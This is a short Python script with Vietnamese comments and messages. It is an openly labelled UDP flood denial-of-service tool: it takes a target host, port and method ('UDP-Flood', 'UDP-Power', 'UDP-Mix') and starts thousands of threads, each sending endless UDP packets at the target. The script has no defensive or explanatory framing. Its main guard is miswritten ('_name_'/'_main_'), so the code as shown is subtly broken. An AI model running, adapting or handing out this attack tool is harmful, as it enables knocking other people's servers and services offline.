import sys
import socket
import threading
import time

host = str(sys.argv[1])
port = int(sys.argv[2])
method = str(sys.argv[3])
loops = 10000  # Giảm số lượng để tránh treo máy iOS

def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((host, port))
        while True:
            s.send(b"\x99" * amplifier)
            time.sleep(0.01)  # Thêm delay để giảm tải CPU
    except Exception as e:
        print(f"Lỗi: {e}")
        s.close()

def attack_HQ():
    print(f"Bắt đầu tấn công {method} tới {host}:{port}")
    
    try:
        if method == "UDP-Flood":
            for _ in range(loops):
                threading.Thread(target=send_packet, args=(375,)).start()
                time.sleep(0.1)
        elif method == "UDP-Power":
            for _ in range(loops):
                threading.Thread(target=send_packet, args=(750,)).start()
                time.sleep(0.1)
        elif method == "UDP-Mix":
            for _ in range(loops//2):
                threading.Thread(target=send_packet, args=(375,)).start()
                threading.Thread(target=send_packet, args=(750,)).start()
                time.sleep(0.1)
    except KeyboardInterrupt:
        print("Dừng tấn công")

if _name_ == "_main_":
    if len(sys.argv) < 4:
        print("Cách dùng: python script.py <host> <port> <method>")
        sys.exit()
    
    attack_HQ()